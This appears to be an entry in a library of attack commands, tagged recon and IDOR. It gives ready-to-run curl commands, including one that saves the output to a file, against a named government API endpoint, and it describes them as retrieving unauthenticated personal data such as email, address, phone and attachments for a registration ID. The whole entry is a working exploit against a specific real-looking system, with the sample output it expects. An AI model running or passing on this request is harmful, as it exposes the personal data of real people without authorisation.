---
data: >-
  curl -X GET
  "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/2634" -H
  "Accept: application/json"
tags:
  - api
  - recon
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:39.369Z'
id: 03e4acd7-566e-4b3c-bfe0-7925f8b05977
verified: false
validated: true
submitted: true
---
# curl-access-user-details

## Command

```bash
curl -X GET "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/2634" -H "Accept: application/json"
```

## Description

Sends a GET request to the TAMS API pendingUserDetails endpoint with a specific registration ID to retrieve JSON containing PII without authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP method | Yes |
| URL with ID | Endpoint with numeric REGISTRATION_ID (e.g., 2634) | Yes |
| `-H "Accept: application/json"` | Requests JSON response format | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/2634"
```

### With Output to File

```bash
curl -X GET "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/2634" -o user_details.json
```

## Expected Output

JSON object with fields like {"email": "example@corp.com", "address": "123 St", "phone": "555-0123", "attachments": [600], "role": "contractor", "status": "pending"}.

## Related

- [[Related Procedure]]
